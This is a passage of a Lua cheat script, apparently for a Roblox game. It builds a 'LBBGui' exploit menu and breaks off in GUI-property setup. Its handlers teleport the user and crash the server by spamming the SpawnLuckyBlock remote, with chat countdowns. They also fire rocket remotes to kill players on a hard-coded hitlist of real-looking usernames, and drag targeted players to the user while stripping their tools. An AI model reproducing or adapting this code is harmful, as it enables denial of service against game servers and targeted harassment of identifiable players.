					UnAirWalk.Visible = false
					AirWalk.Visible = true
				end)
	
				--Clicktp
				ClickTP.MouseButton1Down:connect(function()
					_G.ClickTp = true
					game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessedEvent)
						if (input.KeyCode == Enum.KeyCode.L and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.LeftControl)) or (input.KeyCode == Enum.KeyCode.LeftControl and game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.L)) then
							if game.Players.LocalPlayer:GetMouse().Target then 
								game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer:GetMouse().Hit.x, game.Players.LocalPlayer:GetMouse().Hit.y + 5, game.Players.LocalPlayer:GetMouse().Hit.z)
							end
						end
					end)
				end)
	
				--Crash
				Crash.MouseButton1Down:connect(function()
					local hum = game.Players.LocalPlayer.Character.Humanoid
					local Timer = 50
					local Crash = 0
					local cam = workspace.CurrentCamera
	
					game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
	
					cam.CameraType = Enum.CameraType.Fixed
					cam.Focus = CFrame.new(Vector3.new(0, -9e6, 0))
	
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-9e6,9e6,-9e6)
					wait(0.2)
					game.Players.LocalPlayer.Character.Torso.Anchored = true
					game.CoreGui.RobloxGui:Remove()
					game.Players.LocalPlayer.PlayerGui.LBBGui.DragFrame:Remove()
	
					repeat
						game:GetService("ReplicatedStorage").SpawnLuckyBlock:FireServer()
						game:GetService("RunService").RenderStepped:wait()
					until game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow")
	
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "The Server will crash in 1 minute and 30 Seconds";
						Color = Color3.fromRGB(94,176,0);
						Font = Enum.Font.SourceSansBold;
						FontSize = Enum.FontSize.Size96;
					})
	
					for i = 1, 5020 do
						game:GetService("RunService").RenderStepped:wait()
						game.Players.LocalPlayer.Character.Head.Transparency = 0
						game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow").Parent = game.Players.LocalPlayer.Character
						hum:UnequipTools()
					end
					game.Players.LocalPlayer.Backpack:FindFirstChild("HalloweenBowAndArrow").Parent = game.Players.LocalPlayer.Character
	
					game.Players.LocalPlayer.Character.HalloweenBowAndArrow.Handle.Mesh:Remove()
					game.Players.LocalPlayer.Character.HalloweenBowAndArrow.PumpkinHead.Mesh:Remove()
					game.Players.LocalPlayer.Character.HalloweenBowAndArrow.PumpkinHead:BreakJoints()
					game.Players.LocalPlayer.Character.HalloweenBowAndArrow.PumpkinHead.Position = Vector3.new(-9e6,9e6,-9e6)
					game.Players.LocalPlayer.Character.Head.Transparency = 0
	
					while Timer > Crash  do
						game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("In " .. (Timer) .. " Seconds this server will crash", "All")
						Timer = Timer - 5
						wait(5)
					end
					wait(3)
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = "Server Crashed";
						Color = Color3.fromRGB(176,0,0);
						Font = Enum.Font.SourceSansBold;
						FontSize = Enum.FontSize.Size96;
					})
				end)
	
				--ToVoid
				ToVoid.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.Torso.Anchored = false
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1040100, -1000400, -100290)
					wait(0.1)
					game.Players.LocalPlayer.Character.Torso.Anchored = true
				end)
				ToVoid.MouseButton1Down:connect(function()
					ToVoid.Visible = false
					UnToVoid.Visible = true
				end)
	
				--untovoid
				UnToVoid.MouseButton1Down:connect(function()
					game.Players.LocalPlayer.Character.Torso.Anchored = false
				end)
				UnToVoid.MouseButton1Down:connect(function()
					UnToVoid.Visible = false
					ToVoid.Visible = true
				end)
	
				--InsertTarget
				LockTarget.MouseButton1Down:connect(function()
					table.insert(Targets, Target)
					for i, val in pairs(Targets) do
						print(val)
					end
				end)
	
				--RemoveTarget
				RemoveTarget.MouseButton1Down:connect(function()
					local thingy = table.find(Targets, Target)
					table.remove(Targets, thingy)
					for i, val in pairs(Targets) do
						print(val)
					end
				end)
	
				--printjoins 
				game.Players.PlayerAdded:connect(function(plr)
					local name = plr.Name
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = name .. " Has Joined The Server";
						Color = Color3.fromRGB(0,255,0);
						Font = Enum.Font.SourceSansBold;
						FontSize = Enum.FontSize.Size96;
					})
				end)
	
				game.Players.PlayerRemoving:Connect(function(plr)
					local name = plr.Name
					game.StarterGui:SetCore("ChatMakeSystemMessage", {
						Text = name .. " Has Left The Server";
						Color = Color3.fromRGB(255,0,0);
						Font = Enum.Font.SourceSansBold;
						FontSize = Enum.FontSize.Size96;
					})
				end)
	
				--KillHits
				KillHits.MouseButton1Down:connect(function()
					_G.KillHits = true
	
					while _G.KillHits do
						game:GetService("RunService").RenderStepped:wait()
						pcall(function()
							for i,hit in pairs(game.Players:GetChildren()) do
								if table.find(Hitlist, hit.Name) then
									if hit.Character.Humanoid.Health >= 1 then
										game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),hit.Character.Torso.Position)
									end
								end
							end
						end)
					end
				end)
				KillHits.MouseButton1Down:connect(function()
					KillHits.Visible = false
					UnKillHits.Visible = true
				end)
	
				--unkillhits
				UnKillHits.MouseButton1Down:connect(function()
					_G.KillHits = false
				end)
				UnKillHits.MouseButton1Down:connect(function()
					UnKillHits.Visible = false
					KillHits.Visible = true
				end)
	
				--anticrash
				AntiCrash.MouseButton1Down:connect(function()
					_G.AntiCrash = true
					local CrashGear = {"DragonCompanion", "SillyGuitar", "Ferdinand", "BabyNessieMount", "Wasp", "SharkMount", "RamMount", "WhiteGoldBlueFlowerSword", "SpaceSword", "FestiveMooseMount", "ElkMount", "HalloweenBowAndArrow", "PinataMount"}
					for i,v in pairs(game.Players:GetChildren()) do
						for i,gear in pairs(CrashGear) do
							if v.Backpack:FindFirstChild(gear) then
								game.StarterGui:SetCore("ChatMakeSystemMessage", {
									Text = v.Name .. " Has A Crash Gear";
									Color = Color3.fromRGB(0,0,0);
									Font = Enum.Font.SourceSansBold;
									FontSize = Enum.FontSize.Size96;
								})
								while _G.AntiCrash do
									game:GetService("RunService").RenderStepped:wait()
									pcall(function()
										for i,v in pairs(game.Players:GetChildren()) do
											for i,gear in pairs(CrashGear) do
												if v.Backpack:FindFirstChild(gear) then
													print "2"
													if v.Backpack:FindFirstChild(gear) then
														if game.Players:FindFirstChild(v.Name) then
															if game.Players:FindFirstChild(v.Name).Character.Humanoid.Health >= 1 then
																game.Players.LocalPlayer.Backpack.RocketJumper.FireRocket:FireServer(Vector3.new(0,0,0),game.Players:FindFirstChild(v.Name).Character.Torso.Position)
															end
														end
													end
												end
											end
										end
									end)
								end
							end
						end
					end
				end)
				AntiCrash.MouseButton1Down:connect(function()
					AntiCrash.Visible = false
					UnAntiCrash.Visible = true
				end)
	
				--unanticrash
				UnAntiCrash.MouseButton1Down:connect(function()
					_G.AntiCrash = false
				end)
				UnAntiCrash.MouseButton1Down:connect(function()
					UnAntiCrash.Visible = false
					AntiCrash.Visible = true
				end)
	
				--Characterremove
				CharacterRemove.MouseButton1Down:connect(function()
					local Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
					table.insert(previous, Position)
					_G.RemoveMe = true
					while _G.RemoveMe == true do
						game:GetService("RunService").RenderStepped:wait()
						game.Players.LocalPlayer.Character:Remove()
					end
				end)
	
				CharacterRemove.MouseButton1Down:connect(function()
					UnCharacterRemove.Visible = true
					CharacterRemove.Visible = false
				end)
	
				--UnCharacterremove
				UnCharacterRemove.MouseButton1Down:connect(function()
					_G.RemoveMe = false
					game:GetService("ReplicatedStorage").Remotes.SetRigType:FireServer(Enum.HumanoidRigType.R6)
					wait(0.5)
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(previous[1])
					table.remove(previous, 1)
				end)
				UnCharacterRemove.MouseButton1Down:connect(function()
					UnCharacterRemove.Visible = false
					CharacterRemove.Visible = true
				end)
	
				--KrnlCbring
				KrnlCbring.MouseButton1Down:connect(function()
					_G.TorsoCbring = true
					while _G.TorsoCbring do
						game.RunService.RenderStepped:wait()
						for i,v in pairs(game.Players:GetChildren()) do
							for i,value in pairs(Targets) do
								if v.Name == value and v ~= game.Players.LocalPlayer and v.Name ~= "bielsamorim1" and v.Name ~= "icekingmaster111" then
									for i,val in pairs(v.Character:GetChildren()) do
										if val:IsA("BasePart") then
											val.Anchored = true
											val.CFrame = game.Players.LocalPlayer.Character.Torso.CFrame * CFrame.new(Vector3.new(1.5, 1, -1.8))
										elseif val:IsA("Tool") then
											val:Remove()
										end
									end
								end
							end
						end
					end
				end)
				KrnlCbring.MouseButton1Down:connect(function()
					KrnlCbring.Visible = false
					UnKrnlCbring.Visible = true
				end)
	
				--UnKrnlCbring
				UnKrnlCbring.MouseButton1Down:connect(function()
					_G.TorsoCbring = false
				end)
				UnKrnlCbring.MouseButton1Down:connect(function()
					UnKrnlCbring.Visible = false
					KrnlCbring.Visible = true
				end)
	
				--Hitlist
				Hitlist = {"SenkoVx", "UnidentifiedGlitcher", "kingdinoreal2", "kingdinoreal3", "kaydopepin76", "HoIIow_Dreams", "Orangeabilityy", "New_Gen3", "New_Gen2", "New_Gen4", "Shhreekk", "othersIlIIlllIlIlIIl", "MrMediocree", "Vencizlav", "Ryan09791", "TheBIoodG0D", "MyxCauazin7", "CharlesPham1234", "kurrisu_kun"}
	
			end
			coroutine.wrap(CNJMHJX_fake_script)()
		end
	
		local function Gui2()
			-- Gui to Lua
			-- Version: 3.2
	
			-- Instances:
	
			local LBBGui = Instance.new("ScreenGui")
			local DragFrame = Instance.new("Frame")
			local MainFrame = Instance.new("Frame")
			local Page1Frame = Instance.new("Frame")
			local Title = Instance.new("TextLabel")
			local CBRING = Instance.new("TextButton")
			local Rocket = Instance.new("TextButton")
			local OFF = Instance.new("TextButton")
			local UnRocket = Instance.new("TextButton")
			local GetGear = Instance.new("TextButton")
			local TP = Instance.new("TextButton")
			local Name = Instance.new("TextBox")
			local ToPlr = Instance.new("TextButton")
			local Page1 = Instance.new("TextLabel")
			local TextLabel = Instance.new("TextLabel")
			local RocketTarget = Instance.new("TextButton")
			local UnRocketTarget = Instance.new("TextButton")
			local KillTarget = Instance.new("TextButton")
			local UnKillTarget = Instance.new("TextButton")
			local LockTarget = Instance.new("TextButton")
			local RemoveTarget = Instance.new("TextButton")
			local Page2Frame = Instance.new("Frame")
			local Regen = Instance.new("TextButton")
			local Page2 = Instance.new("TextLabel")
			local GodMode = Instance.new("TextButton")
			local AntiAFK = Instance.new("TextButton")
			local Anchor = Instance.new("TextButton")
			local UnAnchor = Instance.new("TextButton")
			local Speed = Instance.new("TextButton")
			local Jump = Instance.new("TextButton")
			local Info = Instance.new("TextLabel")
			local WalkSpeed1 = Instance.new("TextBox")
			local JumpHeight = Instance.new("TextBox")
			local SafeSpot = Instance.new("TextButton")
			local Next1 = Instance.new("TextButton")
			local Prev1 = Instance.new("TextButton")
			local Next2 = Instance.new("TextButton")
			local Prev2 = Instance.new("TextButton")
			local Page3Frame = Instance.new("Frame")
			local Page3 = Instance.new("TextLabel")
			local InfiniteJump = Instance.new("TextButton")
			local Invis = Instance.new("TextButton")
			local Requires = Instance.new("TextLabel")
			local AirWalk = Instance.new("TextButton")
			local UnAirWalk = Instance.new("TextButton")
			local ClickTP = Instance.new("TextButton")
			local Crash = Instance.new("TextButton")
			local Patience = Instance.new("TextLabel")
			local T = Instance.new("TextLabel")
			local Control = Instance.new("TextLabel")
			local Untoggleable = Instance.new("TextLabel")
			local ToVoid = Instance.new("TextButton")
			local Reset = Instance.new("TextLabel")
			local UnToVoid = Instance.new("TextButton")
			local KillHits = Instance.new("TextButton")
			local UnKillHits = Instance.new("TextButton")
			local CharacterRemove = Instance.new("TextButton")
			local UnCharacterRemove = Instance.new("TextButton")
			local AntiCrash = Instance.new("TextButton")
			local UnAntiCrash = Instance.new("TextButton")
			local KrnlCbring = Instance.new("TextButton")
			local UnKrnlCbring = Instance.new("TextButton")
			local ThanksRyan = Instance.new("Frame")
			local TextLabel_2 = Instance.new("TextLabel")
			local XButton = Instance.new("TextButton")
			local UICorner = Instance.new("UICorner")
			local UICorner_2 = Instance.new("UICorner")
	
			--Properties:
	
			LBBGui.Name = "LBBGui"
			LBBGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	
			DragFrame.Name = "DragFrame"
			DragFrame.Parent = LBBGui
			DragFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			DragFrame.BackgroundTransparency = 1.000
			DragFrame.Position = UDim2.new(0.0364431441, 0, 0.687144518, 0)
			DragFrame.Size = UDim2.new(0, 377, 0, 212)
	
			MainFrame.Name = "MainFrame"
			MainFrame.Parent = DragFrame
			MainFrame.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
			MainFrame.Position = UDim2.new(0.0473273918, 0, 0.113333359, 0)
			MainFrame.Size = UDim2.new(0, 341, 0, 163)
	
			Page1Frame.Name = "Page1Frame"
			Page1Frame.Parent = MainFrame
			Page1Frame.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
			Page1Frame.Position = UDim2.new(0.0861592889, 0, 0, 0)
			Page1Frame.Size = UDim2.new(0, 282, 0, 163)
	
			Title.Name = "Title"
			Title.Parent = Page1Frame
			Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Title.BackgroundTransparency = 1.000
			Title.Position = UDim2.new(0.14293468, 0, -0.0101454677, 0)
			Title.Size = UDim2.new(0, 200, 0, 50)
			Title.Font = Enum.Font.SourceSansLight
			Title.Text = "Adamantiun.Cloud"
			Title.TextColor3 = Color3.fromRGB(255, 255, 255)
			Title.TextSize = 15.00
	
			CBRING.Name = "CBRING"
			CBRING.Parent = Page1Frame
			CBRING.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			CBRING.LayoutOrder = 2
			CBRING.Position = UDim2.new(-5.40167093e-08, 0, 0.793980062, 0)
			CBRING.Size = UDim2.new(0, 32, 0, 31)
			CBRING.Style = Enum.ButtonStyle.RobloxRoundButton
			CBRING.Font = Enum.Font.SourceSansLight
			CBRING.Text = "On"
			CBRING.TextColor3 = Color3.fromRGB(0, 0, 0)
			CBRING.TextSize = 14.000
	
			Rocket.Name = "Rocket"
			Rocket.Parent = Page1Frame
			Rocket.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Rocket.Position = UDim2.new(-0.00354618579, 0, -0.0147240013, 0)
			Rocket.Size = UDim2.new(0, 86, 0, 45)
			Rocket.Style = Enum.ButtonStyle.RobloxRoundButton
			Rocket.Font = Enum.Font.SourceSansLight
			Rocket.Text = "Rocket"
			Rocket.TextColor3 = Color3.fromRGB(0, 0, 0)
			Rocket.TextSize = 14.000
	
			OFF.Name = "OFF"
			OFF.Parent = Page1Frame
			OFF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			OFF.LayoutOrder = 1
			OFF.Position = UDim2.new(-0.00709216297, 0, 0.793979943, 0)
			OFF.Size = UDim2.new(0, 32, 0, 31)
			OFF.Visible = false
			OFF.Style = Enum.ButtonStyle.RobloxRoundButton
			OFF.Font = Enum.Font.SourceSansLight
			OFF.Text = "Off"
			OFF.TextColor3 = Color3.fromRGB(0, 0, 0)
			OFF.TextSize = 14.000
	
			UnRocket.Name = "UnRocket"
			UnRocket.Parent = Page1Frame
			UnRocket.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnRocket.Position = UDim2.new(-6.14672899e-08, 0, -0.0147240702, 0)
			UnRocket.Size = UDim2.new(0, 85, 0, 44)
			UnRocket.Visible = false
			UnRocket.Style = Enum.ButtonStyle.RobloxRoundButton
			UnRocket.Font = Enum.Font.SourceSansLight
			UnRocket.Text = "UnRocket"
			UnRocket.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnRocket.TextSize = 14.000
	
			GetGear.Name = "GetGear"
			GetGear.Parent = Page1Frame
			GetGear.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			GetGear.Position = UDim2.new(0.773049653, 0, 0, 0)
			GetGear.Size = UDim2.new(0, 64, 0, 42)
			GetGear.Style = Enum.ButtonStyle.RobloxRoundButton
			GetGear.Font = Enum.Font.SourceSansLight
			GetGear.Text = "GetGear"
			GetGear.TextColor3 = Color3.fromRGB(0, 0, 0)
			GetGear.TextSize = 14.000
	
			TP.Name = "TP"
			TP.Parent = Page1Frame
			TP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TP.Position = UDim2.new(0.705673754, 0, 0.265928298, 0)
			TP.Size = UDim2.new(0, 81, 0, 53)
			TP.Style = Enum.ButtonStyle.RobloxRoundButton
			TP.Font = Enum.Font.SourceSansLight
			TP.Text = "ToMid"
			TP.TextColor3 = Color3.fromRGB(0, 0, 0)
			TP.TextSize = 14.000
	
			Name.Name = "Name"
			Name.Parent = Page1Frame
			Name.BackgroundColor3 = Color3.fromRGB(217, 217, 217)
			Name.Position = UDim2.new(0.599290788, 0, 0.898427904, 0)
			Name.Size = UDim2.new(0, 107, 0, 15)
			Name.Font = Enum.Font.SourceSans
			Name.PlaceholderText = "Input Name"
			Name.Text = ""
			Name.TextColor3 = Color3.fromRGB(0, 0, 0)
			Name.TextSize = 14.000
	
			ToPlr.Name = "ToPlr"
			ToPlr.Parent = Page1Frame
			ToPlr.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			ToPlr.Position = UDim2.new(-0.00354604423, 0, 0.259793341, 0)
			ToPlr.Size = UDim2.new(0, 88, 0, 54)
			ToPlr.Style = Enum.ButtonStyle.RobloxRoundButton
			ToPlr.Font = Enum.Font.SourceSansLight
			ToPlr.Text = "ToPlr"
			ToPlr.TextColor3 = Color3.fromRGB(0, 0, 0)
			ToPlr.TextSize = 14.000
	
			Page1.Name = "Page 1"
			Page1.Parent = Page1Frame
			Page1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Page1.BackgroundTransparency = 1.000
			Page1.Position = UDim2.new(0.273049712, 0, 0.801993728, 0)
			Page1.Size = UDim2.new(0, 128, 0, 37)
			Page1.Font = Enum.Font.SourceSansItalic
			Page1.Text = "Page 1"
			Page1.TextColor3 = Color3.fromRGB(255, 255, 255)
			Page1.TextSize = 14.000
	
			TextLabel.Parent = Page1Frame
			TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.BackgroundTransparency = 1.000
			TextLabel.Position = UDim2.new(-1.67638063e-08, 0, 0.699386477, 0)
			TextLabel.Size = UDim2.new(0, 114, 0, 17)
			TextLabel.Font = Enum.Font.SourceSansLight
			TextLabel.Text = "Kill all players button"
			TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			TextLabel.TextSize = 14.000
	
			RocketTarget.Name = "RocketTarget"
			RocketTarget.Parent = Page1Frame
			RocketTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			RocketTarget.Position = UDim2.new(0.620567322, 0, 0.653028965, 0)
			RocketTarget.Size = UDim2.new(0, 95, 0, 31)
			RocketTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			RocketTarget.Font = Enum.Font.SourceSansLight
			RocketTarget.Text = "RocketTargetOn"
			RocketTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			RocketTarget.TextSize = 14.000
	
			UnRocketTarget.Name = "UnRocketTarget"
			UnRocketTarget.Parent = Page1Frame
			UnRocketTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnRocketTarget.Position = UDim2.new(0.620999992, 0, 0.652999997, 0)
			UnRocketTarget.Size = UDim2.new(0, 95, 0, 31)
			UnRocketTarget.Visible = false
			UnRocketTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			UnRocketTarget.Font = Enum.Font.SourceSans
			UnRocketTarget.Text = "RocketTargetOff"
			UnRocketTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnRocketTarget.TextSize = 14.000
	
			KillTarget.Name = "KillTarget"
			KillTarget.Parent = Page1Frame
			KillTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			KillTarget.Position = UDim2.new(0.329787254, 0, 0.343558252, 0)
			KillTarget.Size = UDim2.new(0, 95, 0, 40)
			KillTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			KillTarget.Font = Enum.Font.SourceSansLight
			KillTarget.Text = "KillTarget"
			KillTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			KillTarget.TextSize = 14.000
	
			UnKillTarget.Name = "UnKillTarget"
			UnKillTarget.Parent = Page1Frame
			UnKillTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnKillTarget.Position = UDim2.new(0.329787254, 0, 0.343558252, 0)
			UnKillTarget.Size = UDim2.new(0, 95, 0, 40)
			UnKillTarget.Visible = false
			UnKillTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			UnKillTarget.Font = Enum.Font.SourceSansLight
			UnKillTarget.Text = "UnKillTarget"
			UnKillTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnKillTarget.TextSize = 14.000
	
			LockTarget.Name = "LockTarget"
			LockTarget.Parent = Page1Frame
			LockTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			LockTarget.Position = UDim2.new(0.404255331, 0, 0.585544348, 0)
			LockTarget.Size = UDim2.new(0, 32, 0, 30)
			LockTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			LockTarget.Font = Enum.Font.SourceSansLight
			LockTarget.Text = "I"
			LockTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			LockTarget.TextSize = 14.000
	
			RemoveTarget.Name = "RemoveTarget"
			RemoveTarget.Parent = Page1Frame
			RemoveTarget.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			RemoveTarget.Position = UDim2.new(0.517730474, 0, 0.585544348, 0)
			RemoveTarget.Size = UDim2.new(0, 32, 0, 30)
			RemoveTarget.Style = Enum.ButtonStyle.RobloxRoundButton
			RemoveTarget.Font = Enum.Font.SourceSansLight
			RemoveTarget.Text = "R"
			RemoveTarget.TextColor3 = Color3.fromRGB(0, 0, 0)
			RemoveTarget.TextSize = 14.000
	
			Page2Frame.Name = "Page2Frame"
			Page2Frame.Parent = MainFrame
			Page2Frame.BackgroundColor3 = Color3.fromRGB(42, 42, 42)
			Page2Frame.Position = UDim2.new(0.0861592889, 0, 0, 0)
			Page2Frame.Size = UDim2.new(0, 282, 0, 163)
			Page2Frame.Visible = false
	
			Regen.Name = "Regen"
			Regen.Parent = Page2Frame
			Regen.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Regen.Position = UDim2.new(0.37588653, 0, 0, 0)
			Regen.Size = UDim2.new(0, 69, 0, 50)
			Regen.Style = Enum.ButtonStyle.RobloxRoundButton
			Regen.Font = Enum.Font.SourceSansLight
			Regen.Text = "Regen"
			Regen.TextColor3 = Color3.fromRGB(0, 0, 0)
			Regen.TextSize = 14.000
	
			Page2.Name = "Page2"
			Page2.Parent = Page2Frame
			Page2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Page2.BackgroundTransparency = 1.000
			Page2.Position = UDim2.new(0.273000002, 0, 0.801999986, 0)
			Page2.Size = UDim2.new(0, 128, 0, 37)
			Page2.Font = Enum.Font.SourceSansItalic
			Page2.Text = "Page 2 "
			Page2.TextColor3 = Color3.fromRGB(255, 255, 255)
			Page2.TextSize = 14.000
	
			GodMode.Name = "GodMode"
			GodMode.Parent = Page2Frame
			GodMode.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			GodMode.Position = UDim2.new(0.3758865, 0, 0.30674845, 0)
			GodMode.Size = UDim2.new(0, 71, 0, 29)
			GodMode.Style = Enum.ButtonStyle.RobloxRoundButton
			GodMode.Font = Enum.Font.SourceSansLight
			GodMode.Text = "GodMode"
			GodMode.TextColor3 = Color3.fromRGB(0, 0, 0)
			GodMode.TextSize = 14.000
	
			AntiAFK.Name = "Anti-AFK"
			AntiAFK.Parent = Page2Frame
			AntiAFK.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			AntiAFK.Size = UDim2.new(0, 58, 0, 53)
			AntiAFK.Style = Enum.ButtonStyle.RobloxRoundButton
			AntiAFK.Font = Enum.Font.SourceSans
			AntiAFK.Text = "AntiAFK"
			AntiAFK.TextColor3 = Color3.fromRGB(0, 0, 0)
			AntiAFK.TextSize = 14.000
	
			Anchor.Name = "Anchor"
			Anchor.Parent = Page2Frame
			Anchor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Anchor.Position = UDim2.new(0.787234068, 0, 0, 0)
			Anchor.Size = UDim2.new(0, 58, 0, 53)
			Anchor.Style = Enum.ButtonStyle.RobloxRoundButton
			Anchor.Font = Enum.Font.SourceSans
			Anchor.Text = "Anchor"
			Anchor.TextColor3 = Color3.fromRGB(0, 0, 0)
			Anchor.TextSize = 14.000
	
			UnAnchor.Name = "UnAnchor"
			UnAnchor.Parent = Page2Frame
			UnAnchor.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			UnAnchor.Position = UDim2.new(0.787234068, 0, 0, 0)
			UnAnchor.Size = UDim2.new(0, 58, 0, 53)
			UnAnchor.Visible = false
			UnAnchor.Style = Enum.ButtonStyle.RobloxRoundButton
			UnAnchor.Font = Enum.Font.SourceSans
			UnAnchor.Text = "UnAnchor"
			UnAnchor.TextColor3 = Color3.fromRGB(0, 0, 0)
			UnAnchor.TextSize = 14.000
	
			Speed.Name = "Speed"
			Speed.Parent = Page2Frame
			Speed.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Speed.Position = UDim2.new(0.0425531864, 0, 0.325153381, 0)
			Speed.Size = UDim2.new(0, 79, 0, 34)
			Speed.Style = Enum.ButtonStyle.RobloxRoundButton
			Speed.Font = Enum.Font.SourceSansLight
			Speed.Text = "WalkSpeed"
			Speed.TextColor3 = Color3.fromRGB(0, 0, 0)
			Speed.TextSize = 14.000
	
			Jump.Name = "Jump"
			Jump.Parent = Page2Frame
			Jump.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Jump.Position = UDim2.new(0.0425531864, 0, 0.533742309, 0)
			Jump.Size = UDim2.new(0, 79, 0, 34)
			Jump.Style = Enum.ButtonStyle.RobloxRoundButton
			Jump.Font = Enum.Font.SourceSansLight
			Jump.Text = "JumpHeight"
			Jump.TextColor3 = Color3.fromRGB(0, 0, 0)
			Jump.TextSize = 14.000
	
			Info.Name = "Info"
			Info.Parent = Page2Frame
			Info.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Info.BackgroundTransparency = 1.000
			Info.Position = UDim2.new(0.0460992754, 0, 0.742331266, 0)
			Info.Size = UDim2.new(0, 78, 0, 41)
			Info.Font = Enum.Font.SourceSans
			Info.Text = "Normal WalkSpeed is 16 and Normal JumpHeight is 50"
			Info.TextColor3 = Color3.fromRGB(255, 255, 255)
			Info.TextScaled = true
			Info.TextSize = 14.000
			Info.TextWrapped = true
	
			WalkSpeed1.Name = "WalkSpeed"
			WalkSpeed1.Parent = Page2Frame
			WalkSpeed1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			WalkSpeed1.Position = UDim2.new(0.673758864, 0, 0.380368084, 0)
			WalkSpeed1.Size = UDim2.new(0, 90, 0, 16)
			WalkSpeed1.Font = Enum.Font.SourceSans
			WalkSpeed1.PlaceholderText = "SpeedValue"
			WalkSpeed1.Text = "16"
			WalkSpeed1.TextColor3 = Color3.fromRGB(0, 0, 0)
			WalkSpeed1.TextSize = 14.000
	
			JumpHeight.Name = "JumpHeight"
			JumpHeight.Parent = Page2Frame
			JumpHeight.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			JumpHeight.Position = UDim2.new(0.673758864, 0, 0.582822084, 0)
			JumpHeight.Size = UDim2.new(0, 90, 0, 16)
			JumpHeight.Font = Enum.Font.SourceSans
			JumpHeight.PlaceholderColor3 = Color3.fromRGB(178, 178, 178)
			JumpHeight.PlaceholderText = "JumpValue"
			JumpHeight.Text = "50"
			JumpHeight.TextColor3 = Color3.fromRGB(0, 0, 0)
			JumpHeight.TextSize = 14.000
	
			SafeSpot.Name = "SafeSpot"
			SafeSpot.Parent = Page2Frame
			SafeSpot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			SafeSpot.Position = UDim2.new(0.37588653, 0, 0.478527606, 0)
			SafeSpot.Size = UDim2.new(0, 71, 0, 43)
			SafeSpot.Style = Enum.ButtonStyle.RobloxRoundButton
			SafeSpot.Font = Enum.Font.SourceSans
			SafeSpot.Text = "SafeSpot"
			SafeSpot.TextColor3 = Color3.fromRGB(0, 0, 0)
			SafeSpot.TextSize = 14.000
	
			Next1.Name = "Next1"
			Next1.Parent = MainFrame
			Next1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Next1.Position = UDim2.new(0.909356713, 0, 0.364685416, 0)
			Next1.Size = UDim2.new(0, 31, 0, 52)
			Next1.Style = Enum.ButtonStyle.RobloxRoundButton
			Next1.Font = Enum.Font.SourceSansLight
			Next1.Text = "Next"
			Next1.TextColor3 = Color3.fromRGB(0, 0, 0)
			Next1.TextSize = 14.000
	
			Prev1.Name = "Prev1"
			Prev1.Parent = MainFrame
			Prev1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
			Prev1.Position = UDim2.new(-0.00584803894, 0, 0.340145528, 0)
			Prev1.Size = UDim2.new(0, 31, 0, 52)
			Prev1.Visible = false
			Prev1.Style = Enum.ButtonStyle.RobloxRoundButton
			Prev1.Font = Enum.Font.SourceSansLight
			Prev1.Text = "Prev"
			Prev1.TextColor3 = Color3.fromRGB(0, 0, 0)
